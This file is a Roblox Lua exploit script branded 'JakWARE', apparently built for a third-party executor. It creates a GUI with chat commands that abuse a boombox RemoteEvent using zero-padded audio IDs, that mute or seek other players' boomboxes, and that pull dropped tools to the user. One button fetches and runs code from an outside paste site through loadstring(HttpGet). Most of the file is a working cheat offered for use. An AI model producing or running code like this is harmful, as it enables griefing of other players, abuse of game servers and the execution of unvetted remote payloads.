local ScreenGui = Instance.new("ScreenGui")
local main = Instance.new("Frame")
local label = Instance.new("TextLabel")
local InfiniteYeild = Instance.new("TextButton")
local Category = Instance.new("TextLabel")
local Pineapllev11 = Instance.new("TextButton")
local FantaHub = Instance.new("TextButton")
local Category_2 = Instance.new("TextLabel")
local AntiStealv733 = Instance.new("TextButton")
local AntiStealv733_2 = Instance.new("TextButton")
local Ballscript = Instance.new("TextButton")
local NullwareHubV2 = Instance.new("TextButton")
local RE = Instance.new("TextButton")
local NetBypass = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.CoreGui

main.Name = "main"
main.Parent = ScreenGui
main.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.47414431, 0, 0.418355197, 0)
main.Size = UDim2.new(0, 607, 0, 355)
main.Active = true
main.Draggable = true

label.Name = "label"
label.Parent = main
label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
label.BorderColor3 = Color3.fromRGB(0, 0, 0)
label.Size = UDim2.new(0, 607, 0, 42)
label.Font = Enum.Font.PermanentMarker
label.Text = "JakWARE [BETA]"
label.TextColor3 = Color3.fromRGB(0, 0, 0)
label.TextSize = 46.000

InfiniteYeild.Name = "XXX"
InfiniteYeild.Parent = main
InfiniteYeild.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfiniteYeild.BorderColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYeild.Position = UDim2.new(0.0230642483, 0, 0.278873205, 0)
InfiniteYeild.Size = UDim2.new(0, 579, 0, 43)
InfiniteYeild.Font = Enum.Font.GothamBold
InfiniteYeild.Text = "JakWare X"
InfiniteYeild.TextColor3 = Color3.fromRGB(0, 0, 0)
InfiniteYeild.TextScaled = true
InfiniteYeild.TextSize = 28.000
InfiniteYeild.TextWrapped = true

InfiniteYeild.MouseButton1Down:connect(function()
	local plr = game:GetService("Players").LocalPlayer
local charr = game:GetService("Players").LocalPlayer.Character
local players = game:GetService("Players"):GetPlayers()
local gameid = game.PlaceId

print("\nExecuted.")

plr.Chatted:connect(function(message)
    if message:sub(1,3) == "$id" then
        id = message:sub(5)
        local args = message:split(" ")
        
        for _,v in pairs(plr.Backpack:GetChildren()) do
            if v:IsA("Tool") and string.lower(v.Name) == "boombox" then v.Parent = plr.Character end
        end
        
        wait(.1)
        
        local id = args[2]
        
        local zeros = 199950
        for _,v in pairs(plr.Character:GetChildren()) do
            if v:IsA("Tool") and string.lower(v.Name) == "boombox" then v:FindFirstChildOfClass("RemoteEvent"):FireServer("PlaySong", ("0"):rep(zeros)..id, 1, 0, 0) end
        end 
    end
    
    if message:sub(1,3) == "$bp" then
        
    id = message:sub(5)
    
            for _,v in pairs(plr.Backpack:GetChildren()) do
        if v:IsA("Tool") and string.lower(v.Name) == "boombox" then v.Parent = plr.Character end
    end
    
    for _,v in pairs(plr.Character:GetChildren()) do
        local zeros = 199950
        if v:IsA("Tool") and string.lower(v.Name) == "boombox" then v:FindFirstChildOfClass("RemoteEvent"):FireServer("PlaySong", ("0"):rep(zeros)..id, 1, 0, 0) end
    end
    
    wait(.6)
    
    for _,v in pairs(plr.Character:GetChildren()) do
        if v:IsA("Tool") and string.lower(v.Name) == "boombox" then plr.Character.Humanoid:UnequipTools() end
    end
    
    wait(.6)
    
    for _,v in pairs(plr.Backpack:GetChildren()) do
        if v:IsA("Tool") and string.lower(v.Name) == "boombox" then
            v.Handle.Sound.TimePosition = 0
            v.Handle.Sound.Playing = true
        end
    end
    
    end
    if message:sub(1,3) == "$rj" then
        game:GetService("TeleportService"):Teleport(gameid, plr);
    end
    
    if message:sub(1,3) == "$tp" then 
        
        local args = message:split(" ")
        
         for _,v in pairs(plr.Character:GetChildren()) do
            if v:IsA("Tool") and string.lower(v.Name) == "boombox" then
                v.Handle.Sound.TimePosition = args[2]
            end
         end
         
        for _,v in pairs(plr.Backpack:GetChildren()) do
            if v:IsA("Tool") and string.lower(v.Name) == "boombox" then
                v.Handle.Sound.TimePosition = args[2]
            end
        end
         
    end
    if message:sub(1,4) == "$tpa" then
        
    local args = message:split(" ")
    
    for _,v in pairs(game.Players:GetPlayers()) do
    
        if v.Name ~= plr.Name then
            for _,v2 in pairs(game.Workspace[v.Name]:GetChildren()) do
                if v2:IsA("Tool") and string.lower(v2.Name) == "boombox" then 
                    v2.Handle.Sound.TimePosition = args[2] end
                end
                for _,v2 in pairs(v.Backpack:GetChildren()) do
                if v2:IsA("Tool") and string.lower(v2.Name) == "boombox" then 
                    v2.Handle.Sound.TimePosition = args[2] end
                end
            end
        end
    end
    
    if message:sub(1,3) == "$re" then
        charr:BreakJoints()
    end

    if message:sub(1,4) == "$off" then
        for _,v in pairs(game.Players:GetPlayers()) do
            if v.Name ~= plr.Name then
                -- Character
                for _,v2 in pairs(game.Workspace[v.Name]:GetChildren()) do
                    if v2:IsA("Tool") and string.lower(v2.Name) == "boombox" then v2.Handle.Sound.Playing = false; end
                end
                
                -- Backpack
                for _,v2 in pairs(v.Backpack:GetChildren()) do
                    if v2:IsA("Tool") and string.lower(v2.Name) == "boombox" then v2.Handle.Sound.Playing = false; end
                end
            end
        end
    end
    
    if message:sub(1,5) == "$mute" then
        while wait(.03) do
            for _,v in pairs(game.Players:GetPlayers()) do
                if v.Name ~= plr.Name then
                -- Character
                for _,v2 in pairs(game.Workspace[v.Name]:GetChildren()) do
                    if v2:IsA("Tool") and string.lower(v2.Name) == "boombox" then v2.Handle.Sound.TimePosition = 0 end
                end
                
                -- Backpack
                for _,v2 in pairs(v.Backpack:GetChildren()) do
                    if v2:IsA("Tool") and string.lower(v2.Name) == "boombox" then v2.Handle.Sound.TimePosition = 0 end
                end
                end
            end
        end
    end
    
    if message:sub(1,7) == "$steal" then 
        for _,v in pairs(game.workspace:GetChildren()) do
            if v:IsA("Tool") then
                v.Handle.CFrame = plr.Character.Head.CFrame
            end
        end
    end
    
    if message:sub(1,8) == "$lowhold" then
    	if plr.Character:FindFirstChild("Animate").Disabled == true then return end
    	plr.Character.Humanoid:UnequipTools()
    	
    	plr.Character:FindFirstChild("Animate"):FindFirstChild("toolnone"):FindFirstChild("ToolNoneAnim").AnimationId = "nil"		
    	plr.Character.Humanoid:UnequipTools()
    	
    	for _,t in pairs(plr.Backpack:GetChildren()) do
    		if t:IsA("Tool") and t:FindFirstChild("Handle") and t:FindFirstChild("Handle"):FindFirstChild("Sound") then
    			t.GripForward = Vector3.new(1, -1, 0)
    			t.GripPos = Vector3.new(-0, 0.855, 0)
    			t.GripRight = Vector3.new(0.1, 0, 2)
    			t.GripUp = Vector3.new(1, 0, 0)
    			t.Handle.Massless = true
    			t.Parent = plr.Character
    		end
    	end	
    end
end)



end)

Category.Name = "Category"
Category.Parent = main
Category.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Category.BorderColor3 = Color3.fromRGB(0, 0, 0)
Category.BorderSizePixel = 3
Category.Position = UDim2.new(0, 0, 0.118309855, 0)
Category.Size = UDim2.new(0, 607, 0, 49)
Category.Font = Enum.Font.GothamBold
Category.Text = "CMDS: $id $mute $lowhold $steal $mute $off $re $tpa $tp $bp $rj"
Category.TextWrapped = true
Category.TextColor3 = Color3.fromRGB(0, 0, 0)
Category.TextSize = 24.000

Pineapllev11.Name = "SAD1"
Pineapllev11.Parent = main
Pineapllev11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Pineapllev11.BorderColor3 = Color3.fromRGB(0, 0, 0)
Pineapllev11.Position = UDim2.new(0.0230642483, 0, 0.811267555, 0)
Pineapllev11.Size = UDim2.new(0, 128, 0, 43)
Pineapllev11.Font = Enum.Font.GothamBold
Pineapllev11.Text = "SHOULDER"
Pineapllev11.TextColor3 = Color3.fromRGB(0, 0, 0)
Pineapllev11.TextScaled = true
Pineapllev11.TextSize = 28.000
Pineapllev11.TextWrapped = true
Pineapllev11.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Backpack.BoomBox.GripForward =  Vector3.new(-0, -1, 0)
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-0.033, -2.839, 0.396)
game.Players.LocalPlayer.Backpack.BoomBox.GripRight =  Vector3.new(0.174, 0, 0.985)
game.Players.LocalPlayer.Backpack.BoomBox.GripUp =  Vector3.new(0.985, -0, -0.174)
wait(0.2)
game.Players.LocalPlayer:findFirstChildOfClass('Backpack')['BoomBox'].Parent = game.Players.LocalPlayer.Character
wait(0.2)
h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end

end)

FantaHub.Name = "SAD3"
FantaHub.Parent = main
FantaHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FantaHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
FantaHub.Position = UDim2.new(0.283360809, 0, 0.811267555, 0)
FantaHub.Size = UDim2.new(0, 128, 0, 43)
FantaHub.Font = Enum.Font.GothamBold
FantaHub.Text = "Backpack"
FantaHub.TextColor3 = Color3.fromRGB(0, 0, 0)
FantaHub.TextScaled = true
FantaHub.TextSize = 28.000
FantaHub.TextWrapped = true
FantaHub.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://txtpaste.com/raw/e1wO6bMmtt"))()
end)
Category_2.Name = "Category"
Category_2.Parent = main
Category_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Category_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Category_2.BorderSizePixel = 3
Category_2.Position = UDim2.new(0, 0, 0.447887331, 0)
Category_2.Size = UDim2.new(0, 607, 0, 107)
Category_2.Font = Enum.Font.GothamBold
Category_2.Text = "GRIP'S / OTHERS "
Category_2.TextWrapped = true
Category_2.TextColor3 = Color3.fromRGB(0, 0, 0)
Category_2.TextSize = 25.000

AntiStealv733.Name = "SAD2"
AntiStealv733.Parent = main
AntiStealv733.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AntiStealv733.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiStealv733.Position = UDim2.new(0.546952188, 0, 0.811267555, 0)
AntiStealv733.Size = UDim2.new(0, 128, 0, 43)
AntiStealv733.Font = Enum.Font.GothamBold
AntiStealv733.Text = "LOWHOLD V2"
AntiStealv733.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiStealv733.TextScaled = true
AntiStealv733.TextSize = 28.000
AntiStealv733.TextWrapped = true
AntiStealv733.MouseButton1Down:connect(function()
	game.Players.LocalPlayer.Backpack.BoomBox.GripForward =  Vector3.new(-0, -1, 0)
game.Players.LocalPlayer.Backpack.BoomBox.GripPos =  Vector3.new(-0.064, 0.835, -0)
game.Players.LocalPlayer.Backpack.BoomBox.GripRight =  Vector3.new(-0, -0, -1)
game.Players.LocalPlayer.Backpack.BoomBox.GripUp =  Vector3.new(-1, 0, 0)
wait(0.2)
game.Players.LocalPlayer:findFirstChildOfClass('Backpack')['BoomBox'].Parent = game.Players.LocalPlayer.Character
wait(0.2)
h = game.Players.LocalPlayer.Character.Humanoid
tracks = h:GetPlayingAnimationTracks()
for _,x in pairs(tracks)
do x:Stop()
end
end)





--/     \--
--  start
--\     /--

local ScreenGui = Instance.new("ScreenGui")
local drag = Instance.new("Frame")
local main = Instance.new("ImageLabel")
local UIGradient = Instance.new("UIGradient")
local fix = Instance.new("TextButton")
local bttnmain = Instance.new("ImageLabel")
local UIGradient_2 = Instance.new("UIGradient")
local purpefx = Instance.new("ImageLabel")
local UIGradient_3 = Instance.new("UIGradient")
local pressed = Instance.new("ImageLabel")
local UIGradient_4 = Instance.new("UIGradient")
local Texto = Instance.new("TextLabel")
local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
local Textpressed = Instance.new("TextLabel")
local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
local sync = Instance.new("TextButton")
local bttnmain_2 = Instance.new("ImageLabel")
local UIGradient_5 = Instance.new("UIGradient")
local purpefx_2 = Instance.new("ImageLabel")
local UIGradient_6 = Instance.new("UIGradient")
local pressed_2 = Instance.new("ImageLabel")
local UIGradient_7 = Instance.new("UIGradient")
local Texto_2 = Instance.new("TextLabel")
local UIAspectRatioConstraint_3 = Instance.new("UIAspectRatioConstraint")
local Textpressed_2 = Instance.new("TextLabel")
local UIAspectRatioConstraint_4 = Instance.new("UIAspectRatioConstraint")
local TextLabel = Instance.new("TextLabel")
local UIGradient_8 = Instance.new("UIGradient")
local UIAspectRatioConstraint_5 = Instance.new("UIAspectRatioConstraint")
local effxmain = Instance.new("ImageLabel")
local UIGradient_9 = Instance.new("UIGradient")
local UIAspectRatioConstraint_6 = Instance.new("UIAspectRatioConstraint")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.Name = "Sync"
game.StarterGui.ResetPlayerGuiOnSpawn = false

drag.Name = "drag"
drag.Parent = ScreenGui
drag.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
drag.BackgroundTransparency = 1.000
drag.BorderSizePixel = 0
drag.LayoutOrder = 1
drag.Position = UDim2.new(0.0592312589, 0, 0.513029337, 0)
drag.Size = UDim2.new(0, 114, 0, 26)
drag.ZIndex = 2

main.Name = "main"
main.Parent = drag
main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
main.BackgroundTransparency = 1.000
main.Position = UDim2.new(0.0137718599, 0, 0.0249997657, 0)
main.Size = UDim2.new(0, 111, 0, 96)
main.Image = "rbxassetid://3570695787"
main.ScaleType = Enum.ScaleType.Slice
main.SliceCenter = Rect.new(100, 100, 100, 100)
main.SliceScale = 0.120

UIGradient.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))
	}
UIGradient.Rotation = 90
UIGradient.Parent = main

fix.Name = "fix"
fix.Parent = main
fix.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fix.BackgroundTransparency = 1.000
fix.BorderSizePixel = 0
fix.Position = UDim2.new(0.0390090048, 0, 0.611257315, 0)
fix.Size = UDim2.new(0, 101, 0, 22)
fix.ZIndex = 3
fix.Font = Enum.Font.GothamBold
fix.Text = "Fix"
fix.TextColor3 = Color3.fromRGB(255, 255, 255)
fix.TextSize = 14.000

bttnmain.Name = "bttnmain"
bttnmain.Parent = fix
bttnmain.Active = true
bttnmain.AnchorPoint = Vector2.new(0.5, 0.5)
bttnmain.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
bttnmain.BackgroundTransparency = 1.000
bttnmain.Position = UDim2.new(0.5, 0, 0.5, 0)
bttnmain.Selectable = true
bttnmain.Size = UDim2.new(1, 0, 1, 0)
bttnmain.ZIndex = 2
bttnmain.Image = "rbxassetid://3570695787"
bttnmain.ScaleType = Enum.ScaleType.Slice
bttnmain.SliceCenter = Rect.new(100, 100, 100, 100)
bttnmain.SliceScale = 0.120

UIGradient_2.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))
	}
UIGradient_2.Rotation = 90
UIGradient_2.Parent = bttnmain

purpefx.Name = "purpefx"
purpefx.Parent = fix
purpefx.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
purpefx.BackgroundTransparency = 1.000
purpefx.Position = UDim2.new(0, 0, 0, 1)
purpefx.Size = UDim2.new(1, 0, 1, 0)
purpefx.Image = "rbxassetid://3570695787"
purpefx.ScaleType = Enum.ScaleType.Slice
purpefx.SliceCenter = Rect.new(100, 100, 100, 100)
purpefx.SliceScale = 0.120

UIGradient_3.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))
	}
UIGradient_3.Parent = purpefx

pressed.Name = "pressed"
pressed.Parent = fix
pressed.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
pressed.BackgroundTransparency = 1.000
pressed.Position = UDim2.new(0, 0, 0, 2)
pressed.Size = UDim2.new(0, 100, 0, 22)
pressed.ZIndex = 2
pressed.Image = "rbxassetid://3570695787"
pressed.ImageTransparency = 1.000
pressed.ScaleType = Enum.ScaleType.Slice
pressed.SliceCenter = Rect.new(100, 100, 100, 100)
pressed.SliceScale = 0.120

UIGradient_4.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))
	}
UIGradient_4.Rotation = 90
UIGradient_4.Parent = pressed

Texto.Name = "Texto"
Texto.Parent = fix
Texto.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Texto.BackgroundTransparency = 1.000
Texto.Position = UDim2.new(0, 0, 0, -1)
Texto.Size = UDim2.new(0, 100, 0, 22)
Texto.ZIndex = 3
Texto.Font = Enum.Font.GothamBold
Texto.Text = "Fix"
Texto.TextColor3 = Color3.fromRGB(255, 255, 255)
Texto.TextSize = 14.000

UIAspectRatioConstraint.Parent = Texto
UIAspectRatioConstraint.AspectRatio = 4.545

Textpressed.Name = "Textpressed"
Textpressed.Parent = fix
Textpressed.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Textpressed.BackgroundTransparency = 1.000
Textpressed.Size = UDim2.new(0, 100, 0, 22)
Textpressed.ZIndex = 3
Textpressed.Font = Enum.Font.GothamBold
Textpressed.Text = "Fix"
Textpressed.TextColor3 = Color3.fromRGB(255, 255, 255)
Textpressed.TextSize = 14.000
Textpressed.TextTransparency = 1.000

UIAspectRatioConstraint_2.Parent = Textpressed
UIAspectRatioConstraint_2.AspectRatio = 4.545

sync.Name = "sync"
sync.Parent = main
sync.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sync.BackgroundTransparency = 1.000
sync.BorderSizePixel = 0
sync.Position = UDim2.new(0.0430000052, 0, 0.323019534, 0)
sync.Size = UDim2.new(0, 101, 0, 22)
sync.ZIndex = 3
sync.Font = Enum.Font.GothamBold
sync.Text = "Sync"
sync.TextColor3 = Color3.fromRGB(255, 255, 255)
sync.TextSize = 14.000

bttnmain_2.Name = "bttnmain"
bttnmain_2.Parent = sync
bttnmain_2.Active = true
bttnmain_2.AnchorPoint = Vector2.new(0.5, 0.5)
bttnmain_2.BackgroundColor3 = Color3.fromRGB(53, 53, 53)
bttnmain_2.BackgroundTransparency = 1.000
bttnmain_2.Position = UDim2.new(0.5, 0, 0.5, 0)
bttnmain_2.Selectable = true
bttnmain_2.Size = UDim2.new(1, 0, 1, 0)
bttnmain_2.ZIndex = 2
bttnmain_2.Image = "rbxassetid://3570695787"
bttnmain_2.ScaleType = Enum.ScaleType.Slice
bttnmain_2.SliceCenter = Rect.new(100, 100, 100, 100)
bttnmain_2.SliceScale = 0.120

UIGradient_5.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))
	}
UIGradient_5.Rotation = 90
UIGradient_5.Parent = bttnmain_2

purpefx_2.Name = "purpefx"
purpefx_2.Parent = sync
purpefx_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
purpefx_2.BackgroundTransparency = 1.000
purpefx_2.Position = UDim2.new(0, 0, 0, 1)
purpefx_2.Size = UDim2.new(1, 0, 1, 0)
purpefx_2.Image = "rbxassetid://3570695787"
purpefx_2.ScaleType = Enum.ScaleType.Slice
purpefx_2.SliceCenter = Rect.new(100, 100, 100, 100)
purpefx_2.SliceScale = 0.120

UIGradient_6.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))
	}
UIGradient_6.Parent = purpefx_2

pressed_2.Name = "pressed"
pressed_2.Parent = sync
pressed_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
pressed_2.BackgroundTransparency = 1.000
pressed_2.Position = UDim2.new(0, 0, 0, 2)
pressed_2.Size = UDim2.new(0, 100, 0, 22)
pressed_2.ZIndex = 2
pressed_2.Image = "rbxassetid://3570695787"
pressed_2.ImageTransparency = 1.000
pressed_2.ScaleType = Enum.ScaleType.Slice
pressed_2.SliceCenter = Rect.new(100, 100, 100, 100)
pressed_2.SliceScale = 0.120

UIGradient_7.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(39, 39, 39)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(50, 50, 50))
	}
UIGradient_7.Rotation = 90
UIGradient_7.Parent = pressed_2

Texto_2.Name = "Texto"
Texto_2.Parent = sync
Texto_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Texto_2.BackgroundTransparency = 1.000
Texto_2.Position = UDim2.new(0, 0, 0, -1)
Texto_2.Size = UDim2.new(0, 100, 0, 22)
Texto_2.ZIndex = 3
Texto_2.Font = Enum.Font.GothamBold
Texto_2.Text = "Sync"
Texto_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Texto_2.TextSize = 14.000

UIAspectRatioConstraint_3.Parent = Texto_2
UIAspectRatioConstraint_3.AspectRatio = 4.545

Textpressed_2.Name = "Textpressed"
Textpressed_2.Parent = sync
Textpressed_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Textpressed_2.BackgroundTransparency = 1.000
Textpressed_2.Size = UDim2.new(0, 100, 0, 22)
Textpressed_2.ZIndex = 3
Textpressed_2.Font = Enum.Font.GothamBold
Textpressed_2.Text = "Sync"
Textpressed_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Textpressed_2.TextSize = 14.000
Textpressed_2.TextTransparency = 1.000

UIAspectRatioConstraint_4.Parent = Textpressed_2
UIAspectRatioConstraint_4.AspectRatio = 4.545

TextLabel.Parent = main
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.2, 0, -0.0103655122, 0)
TextLabel.Size = UDim2.new(0, 59, 0, 33)
TextLabel.ZIndex = 3
TextLabel.Font = Enum.Font.SourceSansBold
TextLabel.Text = "JAKWARE SYNC"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 14.000

UIGradient_8.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))
	}
UIGradient_8.Parent = TextLabel

UIAspectRatioConstraint_5.Parent = main
UIAspectRatioConstraint_5.AspectRatio = 1.156

effxmain.Name = "effxmain"
effxmain.Parent = drag
effxmain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
effxmain.BackgroundTransparency = 1.000
effxmain.LayoutOrder = 2
effxmain.Position = UDim2.new(-0.00416042935, 0, -0.0261465218, 0)
effxmain.Size = UDim2.new(0, 115, 0, 99)
effxmain.ZIndex = 0
effxmain.Image = "rbxassetid://3570695787"
effxmain.ScaleType = Enum.ScaleType.Slice
effxmain.SliceCenter = Rect.new(100, 100, 100, 100)
effxmain.SliceScale = 0.120

UIGradient_9.Color =
	ColorSequence.new {
		ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 255, 255)),
		ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))
	}
UIGradient_9.Rotation = 90
UIGradient_9.Parent = effxmain

UIAspectRatioConstraint_6.Parent = effxmain
UIAspectRatioConstraint_6.AspectRatio = 1.162

--/           \--
--  Gui effects
--\           /--

local kan = Instance.new("Sound", game.Workspace)
kan.Volume = 5
kan.TimePosition = 0
kan.PlaybackSpeed = 1.01
kan.Pitch = 1.01
kan.SoundId = "rbxassetid://6408099308"
kan.Name = "Clicksfx"
kan.Looped = false
kan:Play()

function spinffx(thingkg)
	spawn(
		function()
			local script = Instance.new("Script", thingkg)
			while true do
				thingkg.Rotation = thingkg.Rotation + 5
				wait(.01)
			end
		end
	)
end

function bababuj(bttn, sfx)
	bttn.MouseButton1Click:Connect(
		function()
			sfx:Play()
			bttn.Texto.TextTransparency = 1
			bttn.TextTransparency = 1
			bttn.Textpressed.TextTransparency = 0
			bttn.bttnmain.ImageTransparency = 1
			bttn.pressed.ImageTransparency = 0
			bttn.purpefx.ImageTransparency = 1
			wait(.08)
			bttn.Texto.TextTransparency = 0
			bttn.TextTransparency = 0
			bttn.Textpressed.TextTransparency = 1
			bttn.bttnmain.ImageTransparency = 0
			bttn.pressed.ImageTransparency = 1
			bttn.purpefx.ImageTransparency = 0
		end
	)
end

spinffx(UIGradient_3)
spinffx(UIGradient_6)
spinffx(UIGradient_8)
spinffx(UIGradient_9)
bababuj(sync, kan)
bababuj(fix, kan)

function draggobrrrr(gui)
	spawn(
		function()
			local UserInputService = game:GetService("UserInputService")
			local dragging
			local dragInput
			local dragStart
			local startPos
			local function update(input)
				local delta = input.Position - dragStart
				gui:TweenPosition(
					UDim2.new(
						startPos.X.Scale,
						startPos.X.Offset + delta.X,
						startPos.Y.Scale,
						startPos.Y.Offset + delta.Y
					),
					"InOut",
					"Quart",
					0.04,
					true,
					nil
				)
			end
			gui.InputBegan:Connect(
				function(input)
					if
						input.UserInputType == Enum.UserInputType.MouseButton1 or
						input.UserInputType == Enum.UserInputType.Touch
					then
						dragging = true
						dragStart = input.Position
						startPos = gui.Position
						input.Changed:Connect(
							function()
								if input.UserInputState == Enum.UserInputState.End then
									dragging = false
								end
							end
						)
					end
				end
			)

			gui.InputChanged:Connect(
				function(input)
					if
						input.UserInputType == Enum.UserInputType.MouseMovement or
						input.UserInputType == Enum.UserInputType.Touch
					then
						dragInput = input
					end
				end
			)
			UserInputService.InputChanged:Connect(
				function(input)
					if input == dragInput and dragging then
						update(input)
					end
				end
			)
		end
	)
end

draggobrrrr(drag)

--/          \--
--  End of gui
--\          /--

local Player = game.Players.LocalPlayer
local plr = Player
local Character = plr.Character
local char = Character
local getto = char:GetChildren()
local bacpac = plr.Backpack
local backpacko = bacpac:GetChildren()
local radios = {}

for k in pairs(radios) do
	radios[k] = nil
end

function justdoit(robuxo, rabaxo, tabelo)
	for _, radz in pairs(robuxo) do
		if radz:IsA("Tool") then
			if radz.Handle:FindFirstChild("Sound") then
				table.insert(tabelo, radz.Handle)
			end
		end
	end
	for _, radz in pairs(rabaxo) do
		if radz:IsA("Tool") then
			if radz.Handle:FindFirstChild("Sound") then
				table.insert(tabelo, radz.Handle)
			end
		end
	end
end

function play(radzs)
	spawn(
		function()
			for i, v in pairs(radios) do
				if v.Sound.Playing == false then
					v.Sound.Playing = true
				end
			end
		end
	)
end

justdoit(getto, backpacko, radios)

--/           \--
--  Sync Button
--\           /--

sync.MouseButton1Down:connect(
	function()
		play(radios)

		for i = 1, #radios do
			repeat wait() until radios[i].Sound.IsLoaded
		end

		spawn(
			function()
				for i = 1, #radios do
					spawn(
						function()
							radios[i].Sound.TimePosition = 0
						end
					)
				end
			end
		)
	end
)

--/           \--
--   Fix  Button
--\           /--

fix.MouseButton1Down:connect(
	function()
		local Player = game.Players.LocalPlayer
		local plr = Player
		local Character = plr.Character
		local char = Character
		local getto = char:GetChildren()
		local bacpac = plr.Backpack
		local backpacko = bacpac:GetChildren()

		for k in pairs(radios) do
			radios[k] = nil
		end

		justdoit(getto, backpacko, radios)

		for i, v in pairs(radios) do
			v.Sound.TimePosition = 0
			v.Sound.Playing = false
		end
	end
)




